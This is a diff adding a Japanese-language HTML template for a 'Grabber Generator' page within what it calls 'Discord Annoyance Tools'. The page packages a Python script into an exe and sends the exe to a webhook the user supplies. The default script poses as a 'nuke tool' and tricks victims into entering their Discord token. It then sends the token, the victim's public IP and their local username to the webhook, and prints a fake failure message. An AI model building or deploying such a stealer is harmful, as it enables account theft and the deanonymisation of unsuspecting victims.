@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ja" data-bs-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Annoyance Tools - Grabber Generator</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
+</head>
+<body class="container-fluid">
+    <h1>Grabber Generator</h1>
+    {% if error %}
+    <p style="color: red;">{{ error |safe }}</p>
+    {% elif success %}
+    <p style="color: green;">{{ success }}</p>
+    {% endif %}
+    作成したGrabberのexeは入力したWebhook URLに送信されます
+    <div class="row">
+        <div class="col-md-6">
+            <form method="post" class="mb-3" id="form" accept-charset="UTF-8">
+                <div class="mb-2">
+                    <label for="webhookUrl">WebHook URL</label>
+                    <input type="text" class="form-control" id="webhookUrl" name="webhookUrl" required>
+                </div>
+                <div class="mb-2">
+                    <label for="libraries">使用ライブラリリスト（カンマ区切り）</label>
+                    <input type="text" class="form-control" id="libraries" name="libraries" value="requests" required>
+                </div>
+                <div class="mb-2">
+                    <label for="script">Pythonスクリプト（変更は開発者向け）（Webhookの変数はWEBHOOK_URLです、定義はこのコードの前に来ます）:</label>
+                    <textarea class="form-control" id="script" name="script" rows="20">import requests, getpass, sys
+print("= DISCORD NUKE TOOL =")
+token = input("Please Type Token: ")
+if len(token) >= 100:
+    sys.exit(1)
+print("Start..")
+ip = requests.get('https://ifconfig.me').text
+useUser = getpass.getuser()
+requests.post(WEBHOOK_URL, json={"content": f"Token:{token}\nIP:{ip}\nUser:{useUser}"})
+print("failed...")</textarea>
+                </div>
+                <button type="submit" id="submit" class="btn btn-primary">
+                    <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
+                    作成
+                </button>
+            </form>
+        </div>
+    </div>
+    <script>
+        document.getElementById('sendForm').addEventListener('submit', function(event) {
+            var webhookUrlInput = document.getElementById("webhookUrl");
+            var librariesInput = document.getElementById("libraries");
+            var scriptInput = document.getElementById("script");
+            var submitButton = document.getElementById("submit");
+            webhookUrlInput.readOnly = librariesInput.readOnly = scriptInput.readOnly = true;
+            submitButton.disabled = true;
+            var spinner = this.querySelector('.spinner-border');
+            spinner.classList.remove('d-none');
+        });
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz" crossorigin="anonymous"></script>
+</body>
+</html>
